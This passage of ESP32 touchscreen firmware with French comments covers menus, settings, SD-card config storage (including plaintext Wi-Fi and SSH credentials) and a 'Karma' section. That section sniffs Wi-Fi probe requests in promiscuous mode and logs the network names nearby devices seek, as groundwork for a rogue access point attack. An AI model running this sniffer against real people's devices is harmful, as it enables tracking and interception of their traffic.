  tft.println("RAM: " + oldRamUsage + " Mo");

  unsigned long lastUpdateTime = millis();
  oldStack = "";
  oldRamUsage = "";

  screenDebounce();

  while (!inMenu) {
    handleDnsRequestSerial();
    delay(10); // Réduction de la charge CPU

    unsigned long currentMillis = millis();
    if (currentMillis - lastUpdateTime >= 1000) {
      String newStack = getStack();
      String newRamUsage = getRamUsage();

      if (newStack != oldStack) {
        tft.setCursor(10, 10);
        tft.fillRect(10, 10, tft.width() - 15, 15, TFT_BLACK);
        tft.println("Stack left: " + newStack + " Kb");
        oldStack = newStack;
      }

      if (newRamUsage != oldRamUsage) {
        tft.setCursor(10, 30);
        tft.fillRect(10, 30, tft.width() - 20, 20, TFT_BLACK);
        tft.println("RAM: " + newRamUsage + " Mo");
        oldRamUsage = newRamUsage;
      }

      lastUpdateTime = currentMillis;
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (x < tft.width() / 3) {
        displayMonitorPage2(); // Retour à la page précédente
        break;
      } else if (x > 2 * (tft.width() / 3)) {
        displayMonitorPage1(); // Retour à la première page
        break;
      } else {
        inMenu = true;
        drawMenu(); // Retour au menu principal
        break;
      }
    }
  }
}


void probeSniffing() {
  isProbeSniffingMode = true;
  isProbeSniffingRunning = true;
  startScanKarma();

  while (isProbeSniffingRunning) {
    handleDnsRequestSerial();

    // Détection du toucher dans la moitié inférieure de l'écran pour arrêter le sniffing
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
      stopProbeSniffingViaSerial = false;
      isProbeSniffingRunning = false;
      break;
    }
  }

  stopScanKarma();
  isProbeSniffingMode = false;
  if (stopProbeSniffingViaSerial) {
    stopProbeSniffingViaSerial = false;
  }
}




void karmaAttack() {
  drawStartButtonKarma();
}

void waitAndReturnToMenu(String message) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.fillRect(0, tft.height() - 20, tft.width(), 20, TFT_BLACK);
  tft.setCursor(50 , tft.height() / 2 );
  tft.println(message);
  //
  delay(1500);
  inMenu = true;
  drawMenu();
}








































void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options, bool loop, bool displayTitle, const String &title = "") {
  int currentIndex = 0;
  bool selectionMade = false;
  const int lineHeight = 20;
  const int maxVisibleLines = 9;
  int menuStartIndex = 0;

  tft.fillScreen(menuBackgroundColor);
  tft.setTextSize(2);
  tft.setTextFont(1);
  screenDebounce();

  for (int i = 0; i < maxVisibleLines; ++i) {
    int optionIndex = menuStartIndex + i;
    if (optionIndex >= options.size()) break;

    if (optionIndex == currentIndex) {
      tft.fillRect(0, 0 + i * lineHeight, tft.width(), lineHeight, menuSelectedBackgroundColor);
      tft.setTextColor(menuTextFocusedColor);
    } else {
      tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    }
    tft.setCursor(0, 0 + i * lineHeight);
    tft.println(options[optionIndex].first);
  }


  while (!selectionMade) {

    bool screenNeedsUpdate = false;

    // Lire le point tactile
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      // Définir les zones pour chaque action
      if (y < tft.height() / 2 && x > tft.width() / 3 && x < 2 * tft.width() / 3) {
        // Zone centrale haute - retour au menu principal
        selectionMade = true;
        waitAndReturnToMenu("Back to menu");
        break;
      } else if (y > tft.height() / 2 && x > tft.width() / 3 && x < 2 * tft.width() / 3) {
        // Zone centrale basse - validation de la sélection
        options[currentIndex].second();
        if (!loop) {
          selectionMade = true;
        }
      } else if (x < tft.width() / 3) {
        // Zone gauche - défilement vers le haut
        currentIndex = (currentIndex - 1 + options.size()) % options.size();
        menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
        screenNeedsUpdate = true;
      } else if (x > 2 * tft.width() / 3) {
        // Zone droite - défilement vers le bas
        currentIndex = (currentIndex + 1) % options.size();
        menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
        screenNeedsUpdate = true;
      }
    }

    if (screenNeedsUpdate) {
      tft.fillScreen(menuBackgroundColor);

      for (int i = 0; i < maxVisibleLines; ++i) {
        int optionIndex = menuStartIndex + i;
        if (optionIndex >= options.size()) break;

        if (optionIndex == currentIndex) {
          tft.fillRect(0, 0 + i * lineHeight, tft.width(), lineHeight, menuSelectedBackgroundColor);
          tft.setTextColor(menuTextFocusedColor);
        } else {
          tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        tft.setCursor(0, 0 + i * lineHeight);
        tft.println(options[optionIndex].first);
      }


      screenNeedsUpdate = false;
    }

    delay(100);
  }
}

void showSettingsMenu() {
  std::vector<std::pair<String, std::function<void()>>> options;

  bool continueSettingsMenu = true;

  while (continueSettingsMenu) {
    options.clear();  // Vider les options à chaque itération pour les mettre à jour dynamiquement

    options.push_back({"Brightness", brightness});
    options.push_back({ledOn ? "LED Off" : "LED On", []() {
      toggleLED();
    }
                      });
    options.push_back({"Set Startup Image", setStartupImage});
    options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {
      toggleRandom();
    }
                      });
    loopOptions(options, false, true, "Settings");

    // Détection de l'écran tactile pour quitter le menu des paramètres
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      // Zone de sortie définie en haut du menu
      if (y < tft.height() / 3 && x > tft.width() / 3 && x < 2 * tft.width() / 3) {
        continueSettingsMenu = false;  // Quitte la boucle et retourne au menu principal
        waitAndReturnToMenu("Exiting Settings...");
        break;
      }
    }

    delay(100);  // Anti-rebond pour limiter les interactions tactiles rapides
  }

  inMenu = true;
}


void saveStartupImageConfig(const String& paramValue) {
  // Lire le contenu du fichier de configuration
  File file = SD.open(configFilePath, FILE_READ);
  String content = "";
  bool found = false;

  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      if (line.startsWith("startupImage=")) {
        // Remplacer la ligne existante par la nouvelle valeur
        content += "startupImage=/img/" + paramValue + "\n";
        found = true;
      } else {
        // Conserver les autres lignes
        content += line + "\n";
      }
    }
    file.close();
  }

  // Si la clé n'a pas été trouvée, l'ajouter à la fin
  if (!found) {
    content += "startupImage=/img/" + paramValue + "\n";
  }

  // Réécrire tout le fichier de configuration
  file = SD.open(configFilePath, FILE_WRITE);
  if (file) {
    file.print(content);
    file.close();
  }
}


void loadStartupImageConfig() {
  File file = SD.open(configFilePath, FILE_READ);
  if (file) {
    while (file.available()) {
      String line = file.readStringUntil('\n');
      if (line.startsWith("startupImage")) {
        selectedStartupImage = line.substring(line.indexOf('=') + 1);
        break;
      }
    }
    file.close();
  }
}

void toggleRandom() {
  randomOn = !randomOn;
  saveConfigParameter("randomOn", randomOn);  // Sauvegarder dans le fichier config
}


std::vector<String> imageFiles = {
  "HiVenoumous.jpg", "infernoDemon.jpg", "InThePocket.jpg", "KNAX-EVILBAT.jpg",
  "neoEvilProject.jpg", "parkour.jpg", "R&MImIn.jpg",
  "R&MPortal.jpg", "R&MSpace.jpg", "startup-cardputer-2.jpg",
  "startup-cardputer.jpg", "superDemonHacker.jpg", "WhySoSerious.jpg",
  "WifiDemon.jpg", "wifiHackingInTown.jpg", "afewmomentlater.jpg", "Evil_WiFi.jpg",
  "hackers-group.jpg", "hackers-watchingU.jpg", "HackThePlanet.jpg", "HackThePlanet2.jpg",
  "Hell's_Evil_Core.jpg", "pedro.jpg", "AlienWifiMaster.jpg", "beach.jpg",
  "BigLivingCardputer.jpg", "CuteEvil.jpg", "cutevilprojects.jpg", "DAKKA-EVILBILLBOARD.jpg",
  "DAKKA-EVILBILLBOARD2.jpg", "DAKKA-M5billboard.jpg", "DejaVu.jpg", "DemonHacker.jpg",
  "EP2.jpg", "Evil-clown.jpg", "Evil-DeathHacker.jpg", "EvilBiohazard.jpg",
  "EvilCoreDemon.jpg", "EvilHacking.jpg", "EvilInDark.jpg", "EvilM5hub.jpg",
  "EvilMoto.jpg", "EvilProject-zombie.jpg", "EvilRickRoll.jpg", "HamsterSound.jpg",
  "WiFi_Demon.jpg", "youshouldnotpass.jpg", "DAKKA-graph.jpg", "DAKKA-graph2.jpg",
  "DiedDysentry.jpg", "EternalBlue.jpg", "IHateMonday.jpg", "WinBSOD.jpg",
  "WinXp.jpg", "WinXp2.jpg", "DAKKA-EvilSkate.jpg", "DAKKA-EvilwithPhone.jpg" , "southpark.jpg", "southpark-2.jpg" , "southpark-all-town.jpg"
};


String getRandomImage() {
  if (imageFiles.size() == 0) {
    return "/img/startup-cardputer.jpg";  // Image par défaut si la liste est vide
  }
  int randomIndex = random(0, imageFiles.size());  // Choisir un index aléatoire
  return "/img/" + imageFiles[randomIndex];  // Retourner le chemin complet de l'image
}

bool imageMode = false; // Variable pour savoir si on est en mode image
void setStartupImage() {
  File root = SD.open("/img");
  std::vector<String> images;

  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      if (fileName.endsWith(".jpg")) {
        images.push_back(fileName);
      }
    }
    file.close();
  }
  root.close();

  if (images.size() == 0) {
    tft.fillScreen(menuBackgroundColor);
    tft.setTextSize(2);
    tft.setCursor(10, tft.height() / 2);
    tft.println("No images found");
    delay(2000);
    return;
  }

  int currentImageIndex = 0;
  bool imageSelected = false;
  const int maxDisplayItems = 8;
  int menuStartIndex = 0;
  bool needDisplayUpdate = true;
  bool imageMode = false;  // Mode liste ou affichage direct de l'image

  screenDebounce();
  while (!imageSelected) {
    if (!imageMode) {
      if (needDisplayUpdate) {
        tft.fillScreen(menuBackgroundColor);
        tft.setCursor(10, 10);
        tft.setTextSize(2);
        tft.setTextColor(menuTextFocusedColor);

        for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < images.size(); i++) {
          int itemIndex = menuStartIndex + i;
          tft.setCursor(0, 0 + i * 24);
          if (itemIndex == currentImageIndex) {
            tft.setTextColor(menuTextFocusedColor);
            tft.fillRect(0, 0 + i * 24, tft.width() - 20, 24, menuSelectedBackgroundColor);
          } else {
            tft.setTextColor(menuTextUnFocusedColor);
          }
          tft.println(images[itemIndex]);
        }

        // Afficher les boutons en bas de l'écran pour Enter et Back
        tft.fillRect(0, tft.height() - 30, tft.width() / 2, 30, TFT_RED);  // Zone 'Back'
        tft.setCursor(10, tft.height() - 20);
        tft.setTextColor(TFT_WHITE);
        tft.print("Back");

        tft.fillRect(tft.width() / 2, tft.height() - 30, tft.width() / 2, 30, TFT_GREEN);  // Zone 'Enter'
        tft.setCursor(tft.width() / 2 + 10, tft.height() - 20);
        tft.print("Enter");

        needDisplayUpdate = false;
      }
    } else {
      if (needDisplayUpdate) {
        tft.fillScreen(menuBackgroundColor);
        String ThisImg = "/img/" + images[currentImageIndex];
        drawJpg(ThisImg.c_str(), 0, 0);
        needDisplayUpdate = false;
      }
    }

    // Gestion du toucher
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (y < tft.height() - 30) {
        if (x < tft.width() / 3) {
          // Zone gauche - défilement vers le haut
          currentImageIndex = (currentImageIndex - 1 + images.size()) % images.size();
          if (currentImageIndex < menuStartIndex) {
            menuStartIndex = currentImageIndex;
          }
          needDisplayUpdate = true;
        } else if (x > 2 * (tft.width() / 3)) {
          // Zone droite - défilement vers le bas
          currentImageIndex = (currentImageIndex + 1) % images.size();
          if (currentImageIndex >= menuStartIndex + maxDisplayItems) {
            menuStartIndex = currentImageIndex - maxDisplayItems + 1;
          }
          needDisplayUpdate = true;
        } else {
          // Zone centrale - bascule entre la liste et l'image
          imageMode = !imageMode;
          needDisplayUpdate = true;
        }
      } else {
        if (x < tft.width() / 2) {
          // Bouton "Back"
          imageSelected = true;
        } else {
          // Bouton "Enter" pour sélectionner l'image
          selectedStartupImage = images[currentImageIndex];
          saveStartupImageConfig(selectedStartupImage);
          String ThisImg = "/img/" + images[currentImageIndex];
          drawJpg(ThisImg.c_str(), 0, 0);
          delay(1000);
          tft.fillScreen(menuBackgroundColor);
          tft.setTextColor(menuTextFocusedColor);
          tft.setCursor(10, tft.height() / 2);
          tft.print("Startup image set to\n" + selectedStartupImage);
          delay(1000);
          imageSelected = true;
        }
      }
    }

    delay(150);  // Anti-rebond pour le toucher
  }
}






void toggleLED() {
  inMenu = false;
  ledOn = !ledOn;  // Inverse l'état du LED

  // Sauvegarde le nouvel état dans le fichier de configuration
  saveConfigParameter("ledOn", ledOn);

}

void brightness() {
  int currentBrightness = 255; // luminosité initiale (max)
  const int minBrightness = 0;
  const int maxBrightness = 255;
  bool brightnessAdjusted = true;
  unsigned long lastTouchTime = 0;
  const unsigned long debounceDelay = 200;

  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(10, 20);
  tft.setTextColor(TFT_WHITE);
  tft.println("Adjust Brightness");

  screenDebounce();

  while (true) {
    handleDnsRequestSerial();

    if (millis() - lastTouchTime > debounceDelay) {
      // Lecture des informations du tactile
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());

        // Zone gauche pour diminuer la luminosité
        if (x < tft.width() / 3) {
          currentBrightness = max(minBrightness, currentBrightness - 12);
          brightnessAdjusted = true;
          lastTouchTime = millis();
        }
        // Zone droite pour augmenter la luminosité
        else if (x > 2 * tft.width() / 3) {
          currentBrightness = min(maxBrightness, currentBrightness + 12);
          brightnessAdjusted = true;
          lastTouchTime = millis();
        }
        // Zone centrale pour confirmer la luminosité et quitter
        else {
          saveConfigParameter("brightness", currentBrightness);
          break;
        }
      }
    }

    // Mise à jour de la luminosité et de l'affichage
    if (brightnessAdjusted) {
      float brightnessPercentage = 100.0 * currentBrightness / maxBrightness;
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(50, tft.height() / 2);
      tft.print("Brightness: ");
      tft.print((int)brightnessPercentage);
      tft.println("%");

      // Ajuster la luminosité du rétroéclairage
      ledcAnalogWrite(LEDC_CHANNEL_0, currentBrightness);

      brightnessAdjusted = false;
    }
  }

  // Confirmer la luminosité finale
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(10, tft.height() / 2);
  tft.print("Brightness set to ");
  tft.print((100.0 * currentBrightness / maxBrightness), 0);
  tft.println("%");
  delay(1000);
}



void saveConfigParameter(String key, int value) {
  if (!SD.exists(configFolderPath)) {
    SD.mkdir(configFolderPath);
  }

  String content = "";
  File configFile = SD.open(configFilePath, FILE_READ);
  if (configFile) {
    while (configFile.available()) {
      content += configFile.readStringUntil('\n') + '\n';
    }
    configFile.close();
  } else {
    Serial.println("Error when opening config.txt for reading");
    return;
  }

  int startPos = content.indexOf(key + "=");
  if (startPos != -1) {
    int endPos = content.indexOf('\n', startPos);
    String oldValue = content.substring(startPos, endPos);
    content.replace(oldValue, key + "=" + String(value));
  } else {
    content += key + "=" + String(value) + "\n";
  }

  configFile = SD.open(configFilePath, FILE_WRITE);
  if (configFile) {
    configFile.print(content);
    configFile.close();
    Serial.println(key + " saved!");
  } else {
    Serial.println("Error when opening config.txt for writing");
  }
}

void restoreConfigParameter(String key) {
  if (SD.exists(configFilePath)) {
    File configFile = SD.open(configFilePath, FILE_READ);
    if (configFile) {
      String line;
      String stringValue;
      int intValue = -1;
      bool boolValue = false;
      bool keyFound = false;

      while (configFile.available()) {
        line = configFile.readStringUntil('\n');
        if (line.startsWith(key + "=")) {
          stringValue = line.substring(line.indexOf('=') + 1);
          if (key == "brightness") {
            intValue = stringValue.toInt();
            ledcAnalogWrite(LEDC_CHANNEL_0, intValue);
            Serial.println("Brightness restored to " + String(intValue));
          } else if (key == "ledOn") {
            boolValue = (stringValue == "1");
            Serial.println(key + " restored to " + String(boolValue));
          } else if (key == "randomOn") {
            boolValue = (stringValue == "1");
            Serial.println("Random Startup restored to " + String(boolValue));
          } else if (key == "selectedTheme") {
            selectedTheme = stringValue;
            Serial.println("Selected Theme restored to " + stringValue);
          } else if (key == "wifi_ssid" && ssid.length() == 0) {
            stringValue.toCharArray(ssid_buffer, sizeof(ssid_buffer));
            ssid = ssid_buffer;
            Serial.println("WiFi SSID restored to " + stringValue);
          } else if (key == "wifi_password" && password.length() == 0) {
            stringValue.toCharArray(password_buffer, sizeof(password_buffer));
            password = password_buffer;
            Serial.println("WiFi Password restored ");
          } else if (key == "ssh_user" && ssh_user.length() == 0) {
            ssh_user = stringValue;
            Serial.println("SSH User restored to " + stringValue);
          } else if (key == "ssh_host" && ssh_host.length() == 0) {
            ssh_host = stringValue;
            Serial.println("SSH Host restored to " + stringValue);
          } else if (key == "ssh_password" && ssh_password.length() == 0) {
            ssh_password = stringValue;
            Serial.println("SSH Password restored");
          } else if (key == "ssh_port") {
            intValue = stringValue.toInt();
            ssh_port = intValue;
            Serial.println("SSH Port restored to " + String(intValue));
          } else if (key == "tcp_host") {
            tcp_host = stringValue;
            Serial.println("TCP host restored to " + String(intValue));
          } else if (key == "tcp_port") {
            intValue = stringValue.toInt();
            tcp_port = intValue;
            Serial.println("TCP Port restored to " + String(intValue));
          }
          keyFound = true;
          break;
        }
      }
      configFile.close();

      if (!keyFound) {
        Serial.println("Key not found in config, using default for " + key);
        if (key == "brightness") {
          ledcAnalogWrite(LEDC_CHANNEL_0, defaultBrightness);
        } else if (key == "ledOn") {
          boolValue = false;  // Default to LED off
        } else if (key == "randomOn") {
          boolValue = false;  // Default to random startup disabled
        }
      }

      // Appliquer les paramètres après récupération
      if (key == "ledOn") {
        ledOn = boolValue;
      } else if (key == "randomOn") {
        randomOn = boolValue;
      }

    } else {
      Serial.println("Error when opening config.txt");
    }
  } else {
    Serial.println("Config file not found, using default values");
    if (key == "brightness") {
      ledcAnalogWrite(LEDC_CHANNEL_0, defaultBrightness);
    } else if (key == "ledOn") {
      ledOn = false;  // Default to LED off
    } else if (key == "randomOn") {
      randomOn = false;  // Default to random startup disabled
    }
  }
}



// Helper function for theming
int getColorValue(const char* colorName) {
  // All TFT_[COLOR] colors defined by M5stack
  if (strcmp(colorName, "TFT_BLACK") == 0) return TFT_BLACK;
  if (strcmp(colorName, "TFT_NAVY") == 0) return TFT_NAVY;
  if (strcmp(colorName, "TFT_DARKGREEN") == 0) return TFT_DARKGREEN;
  if (strcmp(colorName, "TFT_DARKCYAN") == 0) return TFT_DARKCYAN;
  if (strcmp(colorName, "TFT_MAROON") == 0) return TFT_MAROON;
  if (strcmp(colorName, "TFT_PURPLE") == 0) return TFT_PURPLE;
  if (strcmp(colorName, "TFT_OLIVE") == 0) return TFT_OLIVE;
  if (strcmp(colorName, "TFT_LIGHTGREY") == 0) return TFT_LIGHTGREY;
  if (strcmp(colorName, "TFT_DARKGREY") == 0) return TFT_DARKGREY;
  if (strcmp(colorName, "TFT_BLUE") == 0) return TFT_BLUE;
  if (strcmp(colorName, "TFT_GREEN") == 0) return TFT_GREEN;
  if (strcmp(colorName, "TFT_CYAN") == 0) return TFT_CYAN;
  if (strcmp(colorName, "TFT_RED") == 0) return TFT_RED;
  if (strcmp(colorName, "TFT_MAGENTA") == 0) return TFT_MAGENTA;
  if (strcmp(colorName, "TFT_YELLOW") == 0) return TFT_YELLOW;
  if (strcmp(colorName, "TFT_WHITE") == 0) return TFT_WHITE;
  if (strcmp(colorName, "TFT_ORANGE") == 0) return TFT_ORANGE;
  if (strcmp(colorName, "TFT_GREENYELLOW") == 0) return TFT_GREENYELLOW;
  if (strcmp(colorName, "TFT_PINK") == 0) return TFT_PINK;
  if (strcmp(colorName, "TFT_BROWN") == 0) return TFT_BROWN;
  if (strcmp(colorName, "TFT_GOLD") == 0) return TFT_GOLD;
  // Can add your own colors via:
  // if (strcmp(colorName, "[CUSTOM_NAME]") == 0) return M5.Lcd.color565(uint8_t r,uint8_t g,uint8_t b);
  return -1; // Error Case
}

void restoreThemeParameters() {
  Serial.println("Opening Theme File: ");
  Serial.println(selectedTheme.c_str());
  IniFile ini(selectedTheme.c_str());
  if (!ini.open()) {
    Serial.println("Error opening INI file");
    return;
  }

  const size_t bufferLen = 80;
  char valueBuffer[bufferLen]; // Buffer for reading string values
  IniFileState state; // Needed for the getValue calls

  // Read and assign each configuration value from the INI file
  if (!ini.getValue("theme", "taskbarBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read taskbarBackgroundColor");
    return; // Exit if any key read fails
  }
  taskbarBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "taskbarTextColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read taskbarTextColor");
    return;
  }
  taskbarTextColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "taskbarDividerColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read taskbarDividerColor");
    return;
  }
  taskbarDividerColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuBackgroundColor");
    return;
  }
  menuBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuSelectedBackgroundColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuSelectedBackgroundColor");
    return;
  }
  menuSelectedBackgroundColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuTextFocusedColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuTextFocusedColor");
    return;
  }
  menuTextFocusedColor = getColorValue(valueBuffer);

  if (!ini.getValue("theme", "menuTextUnFocusedColor", valueBuffer, bufferLen)) {
    Serial.println("Failed to read menuTextUnFocusedColor");
    return;
  }
  menuTextUnFocusedColor = getColorValue(valueBuffer);

  // Read the boolean value
  if (!ini.getValue("theme", "Colorful", valueBuffer, bufferLen)) {
    Serial.println("Failed to read Colorful");
    return;
  }
  Colorful = (strncmp(valueBuffer, "true", 4) == 0);

  // Close the file
  ini.close();

  // Optionally, print the values to verify
  Serial.println(taskbarBackgroundColor);
  Serial.println(taskbarTextColor);
  Serial.println(taskbarDividerColor);
  Serial.println(menuBackgroundColor);
  Serial.println(menuSelectedBackgroundColor);
  Serial.println(menuTextFocusedColor);
  Serial.println(menuTextUnFocusedColor);
  Serial.println(Colorful ? "True" : "False");
}


























//KARMA-PART-FUNCTIONS

void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (ssid_count_Karma == 0) {
    tft.setCursor(8, tft.height() / 2 - 10);
    tft.println("Waiting for probe...");
  }

  if (frame_type == 0x40) { // Probe Request Frame
    uint8_t ssid_length_Karma = frame[25];
    if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
      char ssidKarma[33] = {0};
      memcpy(ssidKarma, &frame[26], ssid_length_Karma);
      ssidKarma[ssid_length_Karma] = '\0';
      if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
        return;
      }

      bool ssidExistsKarma = false;
      for (int i = 0; i < ssid_count_Karma; i++) {
        if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
          ssidExistsKarma = true;
          break;
        }
      }


      if (isSSIDWhitelisted(ssidKarma)) {
        if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
          seenWhitelistedSSIDs.insert(ssidKarma);
          Serial.println("SSID in whitelist, ignoring: " + String(ssidKarma));
        }
        return;
      }

      if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
        strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
        updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
        Serial.print("Found: ");
        if (ledOn) {
          pixels.setPixelColor(0, pixels.Color(255, 0, 0));
          pixels.show();
          delay(50);

          pixels.setPixelColor(0, pixels.Color(0, 0, 0));
          pixels.show();
          delay(50);
        }
        Serial.println(ssidKarma);
      }
    }
  }
}

void saveSSIDToFile(const char* ssid) {
  bool ssidExists = false;
  File readfile = SD.open("/probes.txt", FILE_READ);
  if (readfile) {
    while (readfile.available()) {
      String line = readfile.readStringUntil('\n');
      if (line.equals(ssid)) {
        ssidExists = true;
        break;
      }
    }
    readfile.close();
  }
  if (!ssidExists) {
    File file = SD.open("/probes.txt", FILE_APPEND);
    if (file) {
      file.println(ssid);
      file.close();
    } else {
      Serial.println("Error opening probes.txt");
    }
  }
}


void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
  const int maxLength = 22;
  char truncatedSSID[maxLength + 1];  // Adjusted size to maxLength to fix bufferoverflow

  tft.fillRect(0, 0, tft.width(), tft.height() - 27, menuBackgroundColor);
  int startIndexKarma = max(0, count - maxMenuDisplay);

  for (int i = startIndexKarma; i < count; i++) {
    if (i >= MAX_SSIDS_Karma) {  // Safety check to avoid out-of-bounds access
      break;
    }

    int lineIndexKarma = i - startIndexKarma;
    tft.setCursor(0, lineIndexKarma * 20);

    if (strlen(ssidsKarma[i]) > maxLength) {
      strncpy(truncatedSSID, ssidsKarma[i], maxLength);
      truncatedSSID[maxLength] = '\0';  // Properly null-terminate
      tft.printf("%d.%s", i + 1, truncatedSSID);
    } else {
      tft.printf("%d.%s", i + 1, ssidsKarma[i]);
    }
  }
  if (count <= 9) {
    tft.fillRect(tft.width() - 15 * 1.5 , 0, 15 * 1.5 , 15, TFT_DARKGREEN);
    tft.setCursor(tft.width() - 13 * 1.5 , 3);
  } else if (count >= 10 && count <= 99) {
    tft.fillRect(tft.width() - 30 * 1.5 , 0, 30 * 1.5 , 15, TFT_DARKGREEN);
    tft.setCursor(tft.width() - 27 * 1.5 , 3);
  } else if (count >= 100 && count < MAX_SSIDS_Karma * 0.7) {
    tft.fillRect(tft.width() - 45 * 1.5 , 0, 45 * 1.5 , 15, TFT_ORANGE);
    tft.setTextColor(TFT_BLACK);
    tft.setCursor(tft.width() - 42 * 1.5 , 3);
    tft.setTextColor(TFT_WHITE);
  } else {
    tft.fillRect(tft.width() - 45 * 1.5 , 0, 45 * 1.5 , 15, TFT_RED);
    tft.setCursor(tft.width() - 42 * 1.5 , 3);
  }
  if (count == MAX_SSIDS_Karma) {
    tft.printf("MAX");
  } else {
    tft.printf("%d", count);
  }

}


void drawStartButtonKarma() {
  tft.fillScreen(TFT_BLACK);
  tft.fillRect(0, tft.height() - 30, tft.width(), 30, TFT_GREEN);
  tft.setCursor(tft.width() / 2 - 24 , tft.height() - 20);
  tft.setTextColor(TFT_BLACK);
  tft.println("Start Sniff");
  tft.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
  tft.setTextColor(TFT_WHITE, TFT_RED);
  tft.fillRect(0, tft.height() - 27, tft.width(), 27, TFT_RED);
  tft.setCursor(tft.width() / 2 - 40, tft.height() - 20);
  tft.println("Stop");
  tft.setTextColor(TFT_WHITE);
}

void startScanKarma() {
  isScanningKarma = true;
  ssid_count_Karma = 0;
  tft.fillScreen(TFT_BLACK);
  drawStopButtonKarma();
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

  readConfigFile("/config/config.txt");
  seenWhitelistedSSIDs.clear();

  Serial.println("-------------------");
  Serial.println("Probe Sniffing Started...");
  Serial.println("-------------------");
}


void stopScanKarma() {
  Serial.println("-------------------");
  Serial.println("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
  Serial.println("-------------------");
  isScanningKarma = false;
  esp_wifi_set_promiscuous(false);


  if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
    Serial.println("Saving SSIDs to SD card automatically...");
    for (int i = 0; i < ssid_count_Karma; i++) {
      saveSSIDToFile(ssidsKarma[i]);
    }
    Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
  } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
    delay(1500);
    bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
    if (saveSSID) {
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0 , tft.height() / 2 );
      tft.println("Saving SSIDs on SD..");
      for (int i = 0; i < ssid_count_Karma; i++) {
        saveSSIDToFile(ssidsKarma[i]);
      }
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0 , tft.height() / 2 );
      tft.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
      Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
    } else {
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0 , tft.height() / 2 );
      tft.println("  No SSID saved.");
    }
    delay(1000);
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
  }


  menuSizeKarma = ssid_count_Karma;
  currentIndexKarma = 0;
  menuStartIndexKarma = 0;

  if (isKarmaMode && ssid_count_Karma > 0) {
    drawMenuKarma();
    currentStateKarma = StopScanKarma;
  } else {
    currentStateKarma = StartScanKarma;
    inMenu = true;
    drawMenu();
  }
  isKarmaMode = false;
  isProbeSniffingMode = false;
  stopProbeSniffingViaSerial = false;
}

void handleMenuInputKarma() {
  bool stateChanged = false;
  static unsigned long lastKeyPressTime = 0;
